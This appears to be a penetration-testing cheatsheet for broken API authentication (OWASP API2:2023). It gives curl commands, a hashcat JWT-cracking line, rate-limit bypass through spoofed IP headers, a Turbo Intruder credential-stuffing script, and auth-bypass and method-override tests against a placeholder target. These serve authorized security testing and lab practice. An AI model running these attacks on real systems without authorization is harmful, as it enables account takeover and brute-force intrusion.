# 05 — API2:2023 Broken Authentication — Field Cheatsheet

Quick-reference consolidation of every test, command, and checklist from this series. Use during live engagements; refer back to files 01–04 for full explanations and reasoning.

---

## 1. Recon Checklist — Run Before Anything Else

- [ ] Enumerate all authentication mechanisms in use (API key, JWT, OAuth bearer token, session cookie) — check docs, mobile app traffic, and web app traffic separately; they may differ.
- [ ] Collect a full endpoint list (from your API recon/endpoint discovery notes) to test systematically rather than sampling.
- [ ] Identify which endpoints are supposed to require authentication vs. which are intentionally public.
- [ ] Confirm testing scope explicitly covers credential stuffing / brute-force volume testing before running Section 4 below — this is higher-impact than single-request tests.

---

## 2. Token Entropy

```
# Decode JWT header/payload
echo "<base64_segment>" | base64 -d

# Crack weak HMAC JWT secret
hashcat -m 16500 -a 0 jwt.txt rockyou.txt
```

- Collect 10-20+ token samples from repeated auth requests → check for sequential/timestamp/short patterns.
- Burp Sequencer: Send to Sequencer → set token location → Start live capture → 1000+ samples → Analyze now.
- Flag: effective entropy below ~128 bits.
- Flag: `alg` = `HS256`/`384`/`512` with a crackable secret.

## 3. Token Reuse Across Sessions

- [ ] Concurrent session test — two logins, same account, check if intended single/multi-session behavior is enforced.
- [ ] Cross-account replay — Account A's token used in Account B's context; should always fail.
- [ ] Logout invalidation — capture token → logout → replay token → should fail.

```
curl -s https://api.target.com/v1/user/profile \
  -H "Authorization: Bearer <TOKEN>"
```

## 4. Insecure Token Transmission

- [ ] Search Burp proxy history for token-shaped strings in URLs, not just headers.
- [ ] Regex for JWT: `eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+`
- [ ] Manually append `?token=`/`?access_token=` to header-only endpoints to check for silent fallback support.
- [ ] Check for token leakage via `Referer` header when authenticated pages load third-party resources.

## 5. Missing Expiration / Revocation

```
# Decode exp claim
echo "<payload_segment>" | base64 -d
# then: date -d @<exp_timestamp>
```

- [ ] `exp` claim absent → likely valid forever.
- [ ] Opaque token: capture → wait past expected session lifetime → replay.
- [ ] Revocation test matrix — test each independently:
  - [ ] Logout
  - [ ] Password change
  - [ ] "Revoke all sessions" feature
  - [ ] Account deactivation/deletion

---

## 6. Rate Limit Detection

```
curl -i -s -X POST https://api.target.com/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser","password":"wrongpass1"}'
```

- [ ] Check headers: `X-RateLimit-Limit`, `X-RateLimit-Remaining`, `X-RateLimit-Reset`, `Retry-After`.
- [ ] Escalate volume in batches (10 → 50 → 100) via Intruder, null payload type — find the exact threshold request count.
- [ ] Determine: fixed window vs. sliding window; keyed to IP, account, or both.

**IP-based bypass test:**
```
curl -s -X POST https://api.target.com/v1/auth/login \
  -H "X-Forwarded-For: 203.0.113.$((RANDOM % 254 + 1))" \
  -d '{"username":"testuser","password":"wrongpass1"}'
```
Also test: `X-Real-IP`, `X-Client-IP`, `True-Client-IP`.

## 7. Response-Based Detection (Username Enumeration)

Check for differences between valid/invalid username responses:
- [ ] Status code (`404` vs `401`)
- [ ] Body message content
- [ ] Response time (hashing delay on valid usernames)
- [ ] Response length/byte count

## 8. Credential Stuffing

- [ ] Confirm explicit authorization for multi-account testing before proceeding.
- [ ] Structure payload as `username:password` pairs.
- [ ] Burp Intruder — **Pitchfork** attack type, two synchronized payload lists (not Sniper/Cluster Bomb).
- [ ] Apply Section 7 response-detection to identify successful pairs.

## 9. Intruder vs. Turbo Intruder — Decision Table

| Scenario | Tool |
|---|---|
| Small threshold batches | Intruder (CE) |
| Hundreds of credential pairs | Intruder (CE) |
| Thousands of pairs | Turbo Intruder |
| Accurate high-volume rate-limit threshold | Turbo Intruder |
| Race-condition rate-limit bypass | Turbo Intruder |

**Turbo Intruder skeleton:**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=10,
                            requestsPerConnection=100,
                            pipeline=False)
    for pair in open('/path/to/pairs.txt'):
        username, password = pair.strip().split(':')
        engine.queue(target.req, [username, password])

def handleResponse(req, interesting):
    if req.status != 401:
        table.add(req)
```

---

## 10. Authentication Bypass — Header Removal

```
curl -s -i https://api.target.com/v1/user/orders                    # no header
curl -s -i https://api.target.com/v1/user/orders -H "Authorization:"           # empty header
curl -s -i https://api.target.com/v1/user/orders -H "Authorization: Bearer"    # empty Bearer value
```

**Bulk sweep across all known endpoints:**
```
while read -r endpoint; do
  echo "=== $endpoint ==="
  curl -s -o /dev/null -w "%{http_code}\n" "https://api.target.com$endpoint"
done < endpoints.txt
```

## 11. Token Format Swapping

- [ ] Enumerate accepted auth mechanisms per endpoint (test `X-API-Key`, `Authorization: Bearer`, etc. independently with invalid values, compare error responses).
- [ ] Test whether a lower-trust credential type (e.g., partner API key) is accepted on higher-trust user-data endpoints.
- [ ] Test whether a token issued for one purpose (password reset, email verification) is accepted as a general session credential.

## 12. HTTP Method Switching

```
for method in GET POST PUT PATCH DELETE OPTIONS HEAD; do
  echo "=== $method ==="
  curl -s -o /dev/null -w "%{http_code}\n" -X "$method" \
    https://api.target.com/v1/user/orders/12345
done
```

**Method override header test:**
```
curl -s -i -X POST https://api.target.com/v1/user/orders/12345 \
  -H "X-HTTP-Method-Override: DELETE"
```
Also test: `X-HTTP-Method`, `X-Method-Override`.

## 13. Sensitive Action Re-Authentication Gaps

Target endpoints: password change, email change, MFA disable, add/remove auth method, account recovery info change, elevated API key generation, account deletion.

**Test 1 — omit current-password field entirely:**
```
curl -s -i -X PUT https://api.target.com/v1/user/password \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"new_password":"NewPass123!"}'
```

**Test 2 — field present but server doesn't validate it:**
```
curl -s -i -X PUT https://api.target.com/v1/user/password \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"current_password":"wrong_value","new_password":"NewPass123!"}'
```

**Test 3 — MFA disable without step-up:**
```
curl -s -i -X DELETE https://api.target.com/v1/user/mfa \
  -H "Authorization: Bearer <TOKEN>"
```

Checklist:
- [ ] Password change requires current password, and it's actually validated server-side
- [ ] Email change requires re-authentication and/or notifies the old email address
- [ ] MFA disable requires current MFA code or password
- [ ] New auth method addition requires re-authentication
- [ ] Elevated-scope API key generation requires re-authentication

---

## 14. Full Lab Mapping Summary

| Technique | PortSwigger Lab | Category |
|---|---|---|
| Weak JWT signing key | JWT authentication bypass via weak signing key | JWT |
| Signature not verified | JWT authentication bypass via unverified signature | JWT |
| Algorithm confusion | JWT authentication bypass via flawed signature verification | JWT |
| jwk/jku header injection | JWT authentication bypass via jwk/jku header injection | JWT |
| Username enumeration (response diff) | Username enumeration via different/subtly different responses | Authentication |
| Username enumeration (timing) | Username enumeration via response timing | Authentication |
| Brute-force IP bypass | Broken brute-force protection, IP block | Authentication |
| Method-based bypass mindset | Method-based access control can be circumvented | Access Control |
| Unprotected functionality mindset | Unprotected admin functionality | Access Control |

**No PortSwigger equivalent — use crAPI instead:** token reuse/replay, insecure token transmission, missing revocation, credential stuffing at API scale, token-format swapping across mechanisms, sensitive-action re-authentication gaps.

crAPI modules to prioritize: community (auth/profile flows), forum, vehicle API (cross-service token behavior).

---

## 15. Severity Framing Quick Reference

| Finding | Typical Severity Driver |
|---|---|
| No auth on endpoint returning sensitive data | Critical — direct data exposure |
| Cross-account token replay works | Critical — full account takeover |
| Weak/crackable JWT secret | Critical — arbitrary token forgery |
| Sensitive action, no re-auth | Critical/High — account takeover chaining |
| Token survives logout/password change | High — persistent unauthorized access |
| Method-switching bypass | High — depends on exposed action |
| Rate limit bypass via header spoofing | Medium/High — enables brute-force/stuffing at scale |
| Username enumeration | Medium — enabler for other attacks, rarely standalone critical |
| Token in URL/query string | Medium — depends on logging/caching exposure |

Severity is always context-dependent on what the bypassed action or exposed data actually is — this table is a starting point, not a substitute for engagement-specific impact analysis.
